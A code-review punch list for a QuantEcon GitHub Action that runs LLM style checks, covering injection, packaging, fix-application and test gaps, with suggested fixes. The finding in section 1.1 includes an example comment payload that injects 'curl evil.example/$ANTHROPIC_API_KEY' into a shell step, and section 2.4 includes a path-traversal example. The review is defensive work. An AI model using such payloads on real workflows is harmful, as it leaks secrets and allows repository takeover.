# Technical Review — `action-style-guide`

> Deep technical review of the QuantEcon Style Guide Checker package.
> **Reviewer:** Claude (Opus 4.7)
> **Date:** 2026-05-25
> **Scope:** All source under `style_checker/`, `tests/`, `docs/`, `action.yml`, `pyproject.toml`, `requirements.txt`, workflows, and examples.
> **Test status at review time:** 91/91 unit tests pass; integration tests not executed.

This document is organized as a punch list. Each finding has a **Severity**, **Location** (file:line where applicable), **What's wrong**, and **Suggested fix**. The most critical items are at the top.

---

## Severity legend

| Mark | Meaning |
|------|---------|
| 🔴 **P0** | Critical — security, data corruption, or guaranteed-broken on supported path. Fix before next release. |
| 🟠 **P1** | Important — wrong behavior, silent failure, or large maintainability cost. Fix soon. |
| 🟡 **P2** | Minor — quality / cleanup / nice-to-have. |
| 🔵 **Info** | Observation or improvement opportunity (no defect). |

---

## 1. Critical bugs (P0)

### 1.1 🔴 Shell injection via `comment-body` in `action.yml`

**Location:** [action.yml:101](action.yml#L101)

The `comment-body` input is interpolated as a bash literal in a composite action `run:` step:

```yaml
python ${{ github.action_path }}/style_checker/action.py \
  ...
  --comment-body "${{ inputs.comment-body }}" \
  --repository "${{ github.repository }}"
```

`comment-body` originates from `github.event.comment.body` / `github.event.issue.body` (see [examples/style-guide-comment.yml:41](examples/style-guide-comment.yml#L41)) — i.e., **attacker-controlled text from anyone who can comment on an issue**. A comment like

```
@qe-style-checker lecture"; curl evil.example/$ANTHROPIC_API_KEY; #
```

…would substitute into the shell command and execute. Because the action runs with `secrets.ANTHROPIC_API_KEY` and `secrets.GITHUB_TOKEN` exported as environment variables, the impact is **secret exfiltration + arbitrary repo write**.

This is the same class of issue GitHub has repeatedly warned about ("Keeping your GitHub Actions and workflows secure: Untrusted input"). The recommended mitigation is to pass user-controlled values via the environment rather than inline interpolation.

**Suggested fix:**

```yaml
- name: Run style checker
  id: run-checker
  shell: bash
  env:
    PYTHONPATH: ${{ github.action_path }}
    ANTHROPIC_API_KEY: ${{ inputs.anthropic-api-key }}
    GITHUB_TOKEN: ${{ inputs.github-token }}
    INPUT_COMMENT_BODY: ${{ inputs.comment-body }}   # <-- pass via env
  run: |
    python "${{ github.action_path }}/style_checker/action.py" \
      --mode "${{ inputs.mode }}" \
      ... \
      --comment-body "$INPUT_COMMENT_BODY" \
      --repository "${{ github.repository }}"
```

Apply the same treatment to any other input that could conceivably be attacker-controlled (`lectures-path`, `pr-branch-prefix`, etc., in case future workflows wire those to event payloads).

---

### 1.2 🔴 Version triple-mismatch across the package

| Source | Version |
|--------|---------|
| [pyproject.toml:3](pyproject.toml#L3) | `0.7.0` |
| [style_checker/__init__.py:6](style_checker/__init__.py#L6) | `0.7.2` |
| [README.md:3](README.md#L3) | `0.7.2` |
| [CHANGELOG.md:10](CHANGELOG.md#L10) | latest entry `0.7.2` |

`pip install` (which reads `pyproject.toml`) will register `qestyle 0.7.0`, but `qestyle --version` will print `0.7.2`. This makes bug reports ambiguous and breaks any downstream tool that relies on PEP 396 / `importlib.metadata.version("qestyle")`.

**Suggested fix:** make `pyproject.toml` the single source of truth and have `__init__.py` derive from it:

```python
# style_checker/__init__.py
from importlib.metadata import version, PackageNotFoundError
try:
    __version__ = version("qestyle")
except PackageNotFoundError:
    __version__ = "0.0.0+unknown"
__author__ = "QuantEcon"
```

Alternatively, configure `setuptools` `dynamic = ["version"]` and read from `__init__.py`. Either way, there should be exactly one place to bump.

---

### 1.3 🔴 `PyGithub` missing from `pyproject.toml` — `pip install` of the package will not install everything the GitHub Action needs

[pyproject.toml:19-21](pyproject.toml#L19-L21):

```toml
dependencies = [
    "anthropic>=0.18.0",
]
```

[requirements.txt](requirements.txt) (used by the action.yml install step):

```
PyGithub>=2.1.1
anthropic>=0.18.0
requests>=2.31.0
pytest>=7.4.0
pytest-cov>=4.1.0
```

Today this is "fine" because:

- The **GitHub Action** installs via `pip install -r requirements.txt` ([action.yml:83](action.yml#L83)), which picks up PyGithub.
- The **CLI** (`qestyle`) doesn't import `github_handler.py`, so PyGithub is not needed at runtime.

But this is fragile:

- Anyone who installs the package via `pip install qestyle` and then imports `style_checker.action` or `style_checker.github_handler` will get `ModuleNotFoundError: No module named 'github'`.
- The `CONTRIBUTING.md` flow (`pip install -e .`) silently lacks PyGithub unless they remember to also `pip install -r requirements.txt`.
- The two files **will drift** over time — there's already a divergence (`requests`, `pytest`, `pytest-cov` are only in `requirements.txt`).

**Suggested fix:** use [optional-dependencies](https://packaging.python.org/en/latest/specifications/dependency-specifiers/#extras) and delete `requirements.txt`:

```toml
dependencies = [
    "anthropic>=0.18.0",
]

[project.optional-dependencies]
action = ["PyGithub>=2.1.1"]
dev = ["pytest>=7.4.0", "pytest-cov>=4.1.0", "ruff"]
```

Then `action.yml` installs with `pip install "${{ github.action_path }}[action]"` and developers use `pip install -e ".[dev,action]"`.

---

### 1.4 🔴 All 8 prompt files are byte-identical — they should be one file

```
$ md5 style_checker/prompts/*.md
MD5 (admonitions-prompt.md) = cca98ab87971ddd31fed9748044c4c25
MD5 (code-prompt.md)        = cca98ab87971ddd31fed9748044c4c25
MD5 (figures-prompt.md)     = cca98ab87971ddd31fed9748044c4c25
MD5 (jax-prompt.md)         = cca98ab87971ddd31fed9748044c4c25
MD5 (links-prompt.md)       = cca98ab87971ddd31fed9748044c4c25
MD5 (math-prompt.md)        = cca98ab87971ddd31fed9748044c4c25
MD5 (references-prompt.md)  = cca98ab87971ddd31fed9748044c4c25
MD5 (writing-prompt.md)     = cca98ab87971ddd31fed9748044c4c25
```

This is intentional per the v0.7.0 design (see [docs/developer/extended-thinking.md:120](docs/developer/extended-thinking.md#L120)), but the **roadmap** explicitly lists "merge 8 identical prompt files into single `prompt.md`" as planned work (see [docs/developer/roadmap.md:47](docs/developer/roadmap.md#L47)).

Until that consolidation lands, **editing one file and forgetting the others will silently change behavior for only some categories**. There is no test that asserts the files are identical, so drift could happen and pass CI.

**Suggested fix (low-risk, can land now):** replace the 8 files with a single `prompts/prompt.md`, change `create_single_rule_prompt()` to load that one file, and delete the per-category lookup:

```python
# style_checker/reviewer.py
def create_single_rule_prompt(category: str, rule: Dict[str, str], lecture_content: str) -> str:
    prompts_dir = Path(__file__).parent / "prompts"
    base_prompt = (prompts_dir / "prompt.md").read_text()
    return f"""{base_prompt}

## Style Rule to Check

**IMPORTANT**: Check ONLY for violations of this specific rule. Do not check other rules.

{rule['content']}

## Lecture to Review

{lecture_content}
"""
```

This deletes 7 duplicate files, removes one footgun, and matches the architecture the docs already describe.

**Belt-and-suspenders alternative (if consolidation needs to wait):** add a test that asserts MD5 equality across the 8 prompt files so drift is caught in CI.

---

### 1.5 🔴 `apply_fixes()` normalized-whitespace fallback is dead code (never applies the fix)

**Location:** [style_checker/fix_applier.py:62-74](style_checker/fix_applier.py#L62-L74)

```python
pos = corrected.find(current_text)
if pos == -1:
    # Try with normalized whitespace
    normalized_current = ' '.join(current_text.split())
    normalized_content = ' '.join(corrected.split())
    pos = normalized_content.find(normalized_current)
    if pos == -1:
        warnings.append(...)
        skipped_count += 1
        continue

violations_with_pos.append((pos, v))
```

If `pos` is found *only* in the normalized version, we append `(pos, v)` and continue, but `pos` is now an index into a **different string** (the whitespace-normalized one), not `corrected`. Worse: the later `corrected.replace(current_text, suggested_fix, 1)` at [line 90](style_checker/fix_applier.py#L90) uses the **original** `current_text`, which by construction was not found in `corrected` — so the replace silently does nothing.

I confirmed this empirically:

```
content = 'This is\nthe original text with some\nnewlines.'
current_text = 'This is the original text with some newlines.'
# Fallback finds it in normalized form (pos != -1)
# But .replace() does nothing because current_text not in corrected
# Result: violation marked "applied"? No, the warning fires later:
#   ⚠️  Could not apply r1: Text changed since parsing
```

Net effect: **the fallback adds a misleading position but the fix still fails**, with a wrong warning ("Text changed since parsing") that obscures the real cause (whitespace mismatch between LLM-quoted text and source).

**Suggested fix:** if the fallback path is meant to do anything useful, it must do the replacement against the *original* content using a whitespace-tolerant match. The simplest, correct version:

```python
pos = corrected.find(current_text)
if pos == -1:
    # Whitespace-tolerant: split source into the same number of whitespace runs
    # and try to find a span. Implementation is non-trivial; safer to just give up
    # and surface a clearer warning.
    warnings.append(
        f"⚠️  Skipping {v.get('rule_id', 'unknown')}: "
        f"LLM-quoted text not found verbatim in source (likely whitespace mismatch) "
        f"at {v.get('location', 'unknown')}"
    )
    skipped_count += 1
    continue
```

If a real whitespace-tolerant matcher is wanted, use a regex built from `re.escape(current_text)` with `\s+` substituted for each run of whitespace, then use `re.subn(..., count=1)`.

---

### 1.6 🔴 `lectures_with_issues` printed but never set

**Location:** [style_checker/action.py:429](style_checker/action.py#L429)

```python
print(f"Lectures with issues: {result.get('lectures_with_issues', 0)}")
```

But [`review_bulk_lectures()`](style_checker/action.py#L145-L251) never puts `lectures_with_issues` into its return dict. The bulk summary will always print `Lectures with issues: 0`, even when there are issues.

**Suggested fix:** compute and store it in `review_bulk_lectures`:

```python
lectures_with_issues = sum(1 for r in all_results if r.get('issues_found', 0) > 0)
...
return {
    'lectures_reviewed': len(lectures),
    'lectures_with_issues': lectures_with_issues,
    'total_issues': total_issues,
    ...
}
```

---

## 2. Security (P0–P1)

### 2.1 🔴 Shell injection in `action.yml` — covered above as 1.1.

### 2.2 🟠 No timeout on Anthropic API calls

**Location:** [style_checker/reviewer.py:338-372](style_checker/reviewer.py#L338-L372)

`self.client.messages.create(**api_kwargs)` and the streaming fallback have no `timeout=` parameter. A hung connection will block the action indefinitely, only freed by the GitHub Actions job timeout (default 6 hours). With 49 rules × N lectures, one stuck call can burn the entire runner budget.

**Suggested fix:** the Anthropic SDK supports per-request timeouts. Set a reasonable cap (e.g., 5 minutes for the non-streaming path, longer for streaming):

```python
self.client = Anthropic(api_key=api_key, timeout=300.0)  # 5 min default
```

…or pass `timeout=` to each `messages.create()` call.

### 2.3 🟠 Broad `except Exception` in the per-rule loop swallows all failures

**Location:** [style_checker/reviewer.py:508-511](style_checker/reviewer.py#L508-L511)

```python
except Exception as e:
    warning = f"Error checking {rule_id}: {str(e)}"
    print(f"      ⚠️  {warning}")
    all_warnings.append(warning)
```

This catches `KeyboardInterrupt`'s parent only because `KeyboardInterrupt` is a `BaseException`, but it does catch `MemoryError`, programming bugs (`AttributeError`, `KeyError`, etc.), API auth failures, and rate limits all the same way. The user sees `"⚠️ Error checking qe-writing-001: 'NoneType' object has no attribute 'foo'"` and the run "succeeds" with `0 issues found`.

Combined with [action.py:77-80](style_checker/action.py#L77-L80) (which only fails when `error` is in `review_result`), **all 49 rules can silently fail and the action will exit 0 with "0 issues found"**. This is exactly the kind of bug that bit v0.7.2 (temperature default of 0 silently broke every rule).

**Suggested fix:** at minimum, propagate the failure rate. After the loop:

```python
if all_warnings and len(all_warnings) >= len(rules) * 0.5:
    # >50% of rules errored — almost certainly a config/auth problem
    raise RuntimeError(
        f"More than half of rule checks failed for category '{category}'. "
        f"First error: {all_warnings[0]}"
    )
```

Even better, distinguish *expected* exceptions (e.g., `anthropic.APIError`) from programmer bugs:

```python
import anthropic

try:
    result = self.provider.check_single_rule(prompt)
except anthropic.APIError as e:
    all_warnings.append(f"API error for {rule_id}: {e}")
# Let everything else bubble up — it's a bug, not a recoverable condition
```

### 2.4 🟡 `pr-branch-prefix` is concatenated into a branch name with no sanitization

**Location:** [style_checker/action.py:88](style_checker/action.py#L88)

```python
branch_name = f"{pr_branch_prefix}/{lecture_name}-{timestamp}"
```

`lecture_name` comes from a regex match on the trigger comment, so it's `\S+`. A comment like `@qe-style-checker ../../etc/passwd` would slip through and produce branch name `style-guide/../../etc/passwd-...`. PyGithub will likely reject it, but the failure surfaces deep in the GitHub API rather than at parse time.

**Suggested fix:** validate `lecture_name` against `^[A-Za-z0-9._-]+$` in `extract_lecture_from_comment` before returning, and reject branch-prefix inputs that contain anything outside `[A-Za-z0-9/_-]`.

---

## 3. Correctness bugs (P1)

### 3.1 🟠 `apply_fixes()` position tracking is misleading — `find()` only returns the first occurrence

**Location:** [style_checker/fix_applier.py:60-79, 87-99](style_checker/fix_applier.py#L60-L99)

The current algorithm:

1. For each violation, `pos = corrected.find(current_text)` (always the **first** occurrence).
2. Sort violations by `pos` descending.
3. For each violation: `corrected = corrected.replace(current_text, suggested_fix, 1)` — replaces the **first** occurrence again.

Consequences:

- When the same `current_text` appears multiple times in the lecture (common for short tokens like `α`, `^T`, `\mathbf{}`), all duplicates collapse to the same `pos`, the descending sort doesn't disambiguate, and we replace from the beginning. This means **the LLM's intent ("fix the third occurrence") cannot be expressed by this pipeline**.
- The `find()` positions are computed *before* any fix is applied, but the second iteration runs against a `corrected` string that has already been mutated by the first replacement. The cached positions are stale; they only happen to "work" because `.replace(..., 1)` always starts from the beginning.

The comment at [line 78-79](style_checker/fix_applier.py#L78-L79) (`"sort by position descending to avoid offset issues"`) is a hint that the author originally intended position-based slicing (which *would* be correct if you used `corrected[:pos] + suggested_fix + corrected[pos+len(current_text):]`). The current implementation is half of that approach — it sorts as if it were going to slice, but then uses `replace`.

**Suggested fix:** commit to one approach. Two options:

**Option A — position-based slicing (faithful to the LLM's intent):**

```python
# After finding positions and sorting descending:
for pos, violation in violations_with_pos:
    ct = violation['current_text'].strip()
    sf = violation['suggested_fix'].strip()
    if corrected[pos:pos+len(ct)] != ct:
        warnings.append(f"⚠️  Position {pos} for {violation['rule_id']} drifted (text changed by earlier fix)")
        continue
    corrected = corrected[:pos] + sf + corrected[pos+len(ct):]
    applied_violations.append(violation)
```

This correctly handles offset shifts because descending order means earlier (higher) positions are processed first, and positions for later (lower) text are unaffected.

**Option B — accept the limitation but document it.** If "always replace first occurrence and re-find on each iteration" is good enough in practice, then the position tracking is dead code that should be removed. Simplify to:

```python
for v in violations:
    ct, sf = v['current_text'].strip(), v['suggested_fix'].strip()
    if not ct or not sf or ct == sf:
        ...  # existing skip logic
        continue
    if ct in corrected:
        corrected = corrected.replace(ct, sf, 1)
        applied_violations.append(v)
    else:
        warnings.append(...)
```

Either way, **stop pretending the current code tracks positions** — it doesn't.

### 3.2 🟠 The third `extract_lecture_from_comment` regex is unreachable

**Location:** [style_checker/github_handler.py:51-58](style_checker/github_handler.py#L51-L58)

```python
new_patterns = [
    r'@qe-style-checker\s+(\S+)\s+([\w,]+)',           # (1) catches lectures/foo + cats
    r'@qe-style-checker\s+`(\S+)`\s+([\w,]+)',         # (2)
    r'@qe-style-checker\s+lectures/(\S+)\s+([\w,]+)',  # (3) never reached
    r'@qe-style-checker\s+(\S+)',                      # (4)
    r'@qe-style-checker\s+`(\S+)`',                    # (5)
    r'@qe-style-checker\s+lectures/(\S+)',             # (6) never reached
]
```

Patterns (3) and (6) can never match — pattern (1) already accepts the full `lectures/foo.md` via `\S+`, then the body strips the `lectures/` prefix at [line 66](style_checker/github_handler.py#L66). Likewise pattern (4) consumes the no-categories form before (6) can run.

**Suggested fix:** delete patterns (3) and (6). They're tested via `test_with_path` ([tests/test_parsing.py:38](tests/test_parsing.py#L38)), but that test passes because pattern (1) already handles the case.

### 3.3 🟠 `parse_markdown_response` doesn't extract `summary` when issues_found = 0 (sometimes)

**Location:** [style_checker/reviewer.py:236-250](style_checker/reviewer.py#L236-L250)

The summary regex is `r'## Summary\s*\n(.+?)(?=\n##|\Z)'`. This is fine when there's a following `## Issues Found` header, but when the LLM produces an unusual format, the lookahead `(?=\n##|\Z)` can grab a multi-line summary that includes a stray heading-like line. Then the short-circuit at line 249 returns before any violation parsing, and we silently keep a polluted summary.

This is minor — but the bigger issue is that the **parser is positionally fragile**. If the LLM swaps the order of `## Summary` and `## Issues Found`, neither field is extracted correctly. Consider:

- Using a state-machine parser keyed off the `##` heading set.
- Or making the LLM emit a small JSON envelope (just `{ "issues_found": N, "summary": "..." }`) at the top and keep the rest as free markdown. With extended thinking + a tiny structured prelude, parsing becomes deterministic.

### 3.4 🟠 `fix_log` records what the LLM said, not what was actually replaced

**Location:** [style_checker/reviewer.py:482-492](style_checker/reviewer.py#L482-L492)

```python
for v in applied:
    fix_log.append({
        'rule_id': v.get('rule_id', 'unknown'),
        ...
        'current_text': v.get('current_text', '').strip(),
        'suggested_fix': v.get('suggested_fix', '').strip(),
        ...
    })
```

The "Applied Fixes" report ([format_applied_fixes_report](style_checker/github_handler.py#L345)) cross-references `fix_log` entries with the diff of original vs. final content. But `current_text` here is the LLM's quote, not the substring actually replaced. When the LLM paraphrases (which it does — that's why §1.5's whitespace fallback exists), the report shows the LLM's quote even though the real edit was on a different substring.

This isn't strictly a bug — the *correct* before/after is reconstructed from the diff. But it means the per-rule `description`/`explanation` attribution can land on the wrong region when `_text_overlaps_region()` ([line 704](style_checker/github_handler.py#L704)) gets a false-positive overlap from a substring match.

**Suggested fix:** have `apply_fixes` return tuples of `(violation, actual_old_text, actual_new_text, byte_offset)` so the fix log records what was *actually* changed. Then region attribution can match on byte offsets rather than text similarity.

### 3.5 🟠 Bulk-mode error in any lecture is caught but PR still says "no issues"

**Location:** [style_checker/action.py:214-216](style_checker/action.py#L214-L216)

```python
except Exception as e:
    print(f"  ❌ Error: {e}")
    all_results.append({'error': str(e), 'lecture': lecture_name})
```

The error-result has no `issues_found` (defaults to 0 via `.get(...)` later), so a lecture that **errored entirely** is silently classified as "clean" in the bulk PR body and contributes 0 to `total_issues`. The errors *are* listed in the body's "Errors" section ([action.py:286-291](style_checker/action.py#L286-L291)) — but the action exit code is 0 and the workflow looks green.

**Suggested fix:** track error count separately and have the bulk path fail the action when error count exceeds a threshold:

```python
errors_count = sum(1 for r in all_results if 'error' in r)
if errors_count >= max(2, len(lectures) // 4):
    sys.exit(1)  # >25% of lectures errored — fail loudly
```

### 3.6 🟠 `create_branch` swallows "Reference already exists" — risk of overwriting an existing review branch

**Location:** [style_checker/github_handler.py:148-155](style_checker/github_handler.py#L148-L155)

```python
except GithubException as e:
    if 'Reference already exists' in str(e):
        # Branch exists, use it
        return branch_name
    raise Exception(f"Failed to create branch: {e}")
```

The branch name includes a `%H%M%S` timestamp, so a collision is unlikely in practice — but if it happens (rapid retries, manual triggers, clock skew), we silently commit on top of someone else's WIP branch. There's no check that the branch was created in *this* run vs. preexisting.

**Suggested fix:** include seconds + a short random suffix in the branch name, and on collision, retry with a new suffix rather than reusing an unknown branch:

```python
import secrets
branch_name = f"{prefix}/{lecture}-{timestamp}-{secrets.token_hex(3)}"
```

### 3.7 🟡 Hard-coded `base_branch='main'`

**Location:** [style_checker/github_handler.py:132](style_checker/github_handler.py#L132), [line 219](style_checker/github_handler.py#L219)

Any repository whose default branch is `master`, `develop`, or anything else will fail. `action.yml` doesn't expose `base-branch` as an input.

**Suggested fix:** resolve the default branch from the repo metadata at startup:

```python
self.default_branch = self.repo.default_branch  # PyGithub provides this
```

…and use that as the fallback for both `create_branch` and `create_pull_request`.

### 3.8 🟡 `find_lecture_file` returns the first matching path, not necessarily the one the user meant

**Location:** [style_checker/github_handler.py:100-114](style_checker/github_handler.py#L100-L114)

The list of `possible_paths` checks `lectures/{name}.md`, `lectures/{name}.myst`, `{name}.md`, `{name}.myst` in order. A lecture present at both `lectures/foo.md` and the repo root would silently use the former — which is probably right, but it's also possible to construct mismatches with `lectures-path` overrides.

Low priority — current behavior is intuitive — but worth documenting in [docs/user/configuration.md](docs/user/configuration.md).

---

## 4. Architecture & design (P1–P2)

### 4.1 🟠 `prompt_loader.py` is dead production code

Only [tests/test_prompt_loader.py](tests/test_prompt_loader.py) and [tests/test_reviewer.py](tests/test_reviewer.py) import from `style_checker.prompt_loader`. The runtime (`reviewer.py`) uses its own [`create_single_rule_prompt`](style_checker/reviewer.py#L150) which reimplements prompt loading.

This is the worst of both worlds:

- Real runtime behavior is not exercised by `test_prompt_loader.py`.
- `prompt_loader.py` is maintained but has zero production impact.
- `test_reviewer.py` imports `PromptLoader` *only* to read `VALID_CATEGORIES`, which is also defined in `cli.py` (`ALL_CATEGORIES`) and `github_handler.py` (`VALID_CATEGORIES`) — three separate sources of truth.

**Suggested fix (one of):**

1. **Delete `prompt_loader.py`.** Move `VALID_CATEGORIES` to a single module (e.g., `style_checker/categories.py`) and have `cli.py`, `github_handler.py`, and tests import it from there.
2. **Use `prompt_loader.py` everywhere.** Refactor `reviewer.py` to call `PromptLoader.load_prompt(...)` instead of its own homegrown loader.

Option 1 is simpler given the current architecture (single-rule-at-a-time evaluation makes the multi-category combine path in `prompt_loader.py` irrelevant).

### 4.2 🟠 `VALID_CATEGORIES` defined in three places, can drift silently

| File | Symbol |
|------|--------|
| [style_checker/cli.py:29](style_checker/cli.py#L29) | `ALL_CATEGORIES` (list) |
| [style_checker/github_handler.py:18](style_checker/github_handler.py#L18) | `VALID_CATEGORIES` (set) |
| [style_checker/prompt_loader.py:16](style_checker/prompt_loader.py#L16) | `VALID_CATEGORIES` (list) |
| [style_checker/reviewer.py:18](style_checker/reviewer.py#L18) | `RULE_EVALUATION_ORDER` keys (dict) |
| [style_checker/reviewer.py:559-568](style_checker/reviewer.py#L559-L568) | `all_categories` (list, inside method) |

The fact that all four currently agree is enforced only by tests ([test_reviewer.py:91-95](tests/test_reviewer.py#L91-L95)) — and even those only check 2 of the 4 sources. Adding a new category requires touching at least four locations.

**Suggested fix:** one module exporting one collection. Everything else imports from there.

### 4.3 🟠 The "sequential apply-and-recheck" architecture amplifies hallucinations

The reviewer applies fixes from rule N before sending the document to rule N+1 ([reviewer.py:471-479](style_checker/reviewer.py#L471-L479)). The intent is good (no conflicting edits), but the consequence is that a wrong fix from rule N becomes ground truth for rules N+1...N+M.

The existing `IMPROVEMENTS.md` document already identifies most of the failure modes here:

- str.replace is position-unaware
- LLMs occasionally hallucinate `current_text`
- A bad early fix poisons the entire downstream review

Two concrete mitigations beyond what's already planned:

1. **Reject "structural" fixes** that delete a `#` header, change directive types, or remove fenced-code blocks. A pre-`apply_fixes` check can compare the AST/heading structure of `current_text` vs. `suggested_fix` and refuse changes that delete a heading or directive.
2. **Snapshot + rollback on validation failure.** After each rule's fixes are applied, run a quick structural sanity check (header count, directive count, fenced-block count). If any decreased unexpectedly, roll back and skip that rule with a warning.

This is the "structural guardrails" roadmap item; it's high-leverage and worth prioritizing.

### 4.4 🟡 49 sequential LLM calls per review is the dominant cost driver

Per the docs, a full single-lecture review is $0.08–0.40 and takes minutes. The architecture is intentionally serial (sequential apply-and-recheck), but **rules within a category that are independent of each other** could batch.

For example, `qe-math-001` (unicode for parameters) and `qe-math-002` (transpose notation) operate on disjoint substrings. There's no need to wait for math-001 to apply before checking math-002.

The roadmap already mentions this as a future enhancement. A pragmatic intermediate step: group rules into "stages" by the file regions they touch, and run rules within a stage concurrently via `asyncio.gather` (the `anthropic` SDK has async support).

### 4.5 🟡 No retry/backoff for transient errors

[`AnthropicProvider.check_single_rule`](style_checker/reviewer.py#L338) makes one attempt. A 429 or 5xx from the API surfaces as a per-rule warning and the rule is silently skipped. Across 49 calls, even a low error rate sums to "1 rule skipped per review on average."

**Suggested fix:** wrap the API call in `tenacity.retry` (or hand-rolled exponential backoff). The `anthropic` SDK can be configured with `max_retries=3` at the client level — which is one line:

```python
self.client = Anthropic(api_key=api_key, max_retries=3, timeout=300.0)
```

### 4.6 🟡 No structured logging

The whole codebase uses `print()`. Every emoji-prefixed line goes to stdout. This makes it hard to:

- Suppress noise in CI logs while keeping warnings.
- Capture structured telemetry (rule duration, token counts, retry attempts).
- Differentiate "info I'm running this rule" from "error I couldn't reach the API."

**Suggested fix:** introduce `logging.getLogger(__name__)` and use it consistently. Keep the emoji and CLI niceties at the top-level `cli.py` / `action.py` entry points (which can configure log handlers), but `reviewer.py` / `fix_applier.py` / `github_handler.py` should log, not print. This also makes it possible to add `--quiet` and `--verbose` flags to the CLI.

### 4.7 🔵 The minimal-prompt result (extended thinking, 0% FP) is impressive — preserve it as a benchmark

The [docs/developer/extended-thinking.md](docs/developer/extended-thinking.md) experiments document a real win. To prevent regression, build a "false-positive regression test":

- Curate a small lecture corpus with known ground-truth violations.
- Add a `pytest -m benchmark` target that runs the reviewer and asserts FP rate is below a threshold.
- Run it manually on every prompt change (it'll cost a few dollars).

Cheap insurance against silent quality regressions when the prompt or rules change.

---

## 5. Build, packaging, and dependency hygiene (P1–P2)

### 5.1 🟠 Migrate the project to `uv` (recommended)

The project is currently managed by `pip + setuptools` with `requirements.txt` + `pyproject.toml` split (see §1.3). `uv` would solve several issues at once:

| Pain today | Fix with `uv` |
|------------|-------------|
| `requirements.txt` and `pyproject.toml` declare different deps | Single `pyproject.toml`; `uv` writes a `uv.lock` |
| No reproducible builds across CI / contributor laptops | `uv.lock` gives deterministic install |
| `pip install -r requirements.txt && pip install -e .` boilerplate in `action.yml`, CI, CONTRIBUTING.md | `uv sync` |
| Slow Python 3.11/3.12/3.13 matrix in CI | `uv` installs ~10× faster |
| Python version pin lives only in `action.yml` (`python-version: '3.11'`) | `uv` reads `requires-python` from `pyproject.toml` and can manage interpreters via `uv python install` |

**Migration outline** (small, reversible):

1. Add a `uv.lock` by running `uv lock` once locally and committing it.
2. Replace `requirements.txt` install in [action.yml:80-83](action.yml#L80-L83) with:
   ```yaml
   - name: Install uv
     uses: astral-sh/setup-uv@v3
     with:
       enable-cache: true
   - name: Install dependencies
     shell: bash
     run: uv sync --extra action
     working-directory: ${{ github.action_path }}
   - name: Run style checker
     shell: bash
     run: uv run python style_checker/action.py ...
   ```
3. Replace the two-step install in [.github/workflows/ci.yml:30-34](.github/workflows/ci.yml#L30-L34) with `uv sync --all-extras` and `uv run pytest tests/`.
4. Update [CONTRIBUTING.md](docs/developer/contributing.md) and [cli.md](docs/user/cli.md) install instructions:
   ```bash
   uv sync             # install editable + dev deps
   uv run qestyle ...  # run without activating venv
   ```
5. Delete `requirements.txt` once everything is on `uv`.

Net effect: one source of truth for deps, deterministic CI, faster install, no orphaned `egg-info` directories.

(If you prefer to keep `pip`, fix §1.3 by moving everything into `pyproject.toml` with `[project.optional-dependencies]`. That's the minimum needed.)

### 5.2 🟡 Committed build artifacts in repo root

```
.coverage              (not in git, but present locally — should be deleted)
htmlcov/               (not in git; same)
qestyle.egg-info/      (not in git; same)
style_checker.egg-info/ (not in git; same)
.DS_Store              (not in git; same)
.tmp/                  (tracked via .gitkeep)
.reports/              (tracked with 1 report file — confirm intent)
test-action-style-guide/ (gitignored)
```

These aren't *in* git (good), but the working directory is cluttered enough that contributors might accidentally commit them. The `.gitignore` covers most of these, but:

- `.DS_Store` is in `.gitignore` — fine, just noting it's present.
- `.tmp/.gitkeep` is fine.
- `.reports/` contains one historical file — is this intended as a permanent artifact, or should it be moved out of the repo?

No action required, but worth thinking about whether `.reports/` belongs in the repo at all.

### 5.3 🟡 Two `egg-info` directories suggest both `qestyle` and `style_checker` have been registered as packages at different times

- `qestyle.egg-info/` and `style_checker.egg-info/` both present locally.
- `pyproject.toml` says `name = "qestyle"`.
- `[tool.setuptools.packages.find]` includes `style_checker*` (good).

This is harmless leftover, but a `rm -rf *.egg-info` + clean reinstall is in order. If you switch to `uv`, this goes away.

### 5.4 🟡 Python version pin is single-sourced in the wrong file

[action.yml:77](action.yml#L77) hard-codes `python-version: '3.11'`, but [pyproject.toml:6](pyproject.toml#L6) says `requires-python = ">=3.11"`. The CI matrix tests 3.11/3.12/3.13, but production always uses 3.11.

If a 3.12-only feature ever lands, CI will pass and production will break. Either pin to a single version everywhere (recommend 3.12+, drop 3.11 from `requires-python`) or use `actions/setup-python` with `python-version-file: pyproject.toml`.

---

## 6. Tests (P1–P2)

### 6.1 🟠 0% coverage on `action.py` (per the docs)

[docs/developer/testing.md:80](docs/developer/testing.md#L80):

> | `action.py` | 0% (needs integration mocking) |

This is the file most likely to break in production (it orchestrates everything and has multiple GitHub Actions output-writing paths). The bug in §1.6 (`lectures_with_issues` never set) is exactly the kind of thing a single test would catch.

**Suggested fix:** mock `GitHubHandler` and `StyleReviewer`, then test the orchestration in `action.py`:

```python
def test_review_single_lecture_returns_pr_info(monkeypatch):
    gh = MagicMock()
    gh.find_lecture_file.return_value = "lectures/foo.md"
    gh.get_lecture_content.return_value = "content"
    gh.create_pull_request.return_value = (42, "https://x/pr/42")
    reviewer = MagicMock()
    reviewer.review_lecture_single_rule.return_value = {
        'issues_found': 3,
        'violations': [...],
        'corrected_content': 'fixed',
        ...
    }
    result = review_single_lecture("foo", gh, reviewer, "lectures/", True, "style-guide", ["writing"])
    assert result['pr_number'] == 42
    assert gh.create_pull_request.call_count == 1
```

A handful of these would lift `action.py` from 0% to ~80% and catch the kind of bugs that bit v0.7.1 and v0.7.2.

### 6.2 🟠 Tests import from the dead `prompt_loader.py`

[tests/test_reviewer.py:9](tests/test_reviewer.py#L9):

```python
from style_checker.prompt_loader import PromptLoader
```

…then [line 30](tests/test_reviewer.py#L30) uses `PromptLoader.VALID_CATEGORIES`. If `prompt_loader.py` is deleted (per §4.1), these tests need to import from the new single source of truth.

### 6.3 🟡 `test_cli.py` uses awkward import workaround

[tests/test_cli.py:283](tests/test_cli.py#L283):

```python
env={**__import__('os').environ, 'ANTHROPIC_API_KEY': 'fake-key'}
```

`import os` is at the top of stdlib; just `import os` at the top of the file and use `os.environ`.

### 6.4 🟡 Pytest config forces coverage on every `pytest` invocation

[pyproject.toml:53-61](pyproject.toml#L53-L61) hard-codes `--cov=style_checker --cov-report=term-missing --cov-report=html` in `addopts`. This means:

- `pytest` always requires `pytest-cov` installed (otherwise: `error: unrecognized arguments: --cov=...` as I hit during this review).
- Every test run regenerates `htmlcov/`, which pollutes the working tree.
- Iterating on a single test (`pytest tests/test_cli.py::test_foo`) pays the full coverage tax.

**Suggested fix:** move coverage flags into a separate addopts file or a `tox`/`uv run` task:

```toml
[tool.pytest.ini_options]
addopts = ["-v", "--strict-markers", "-m", "not integration", "--tb=short"]
```

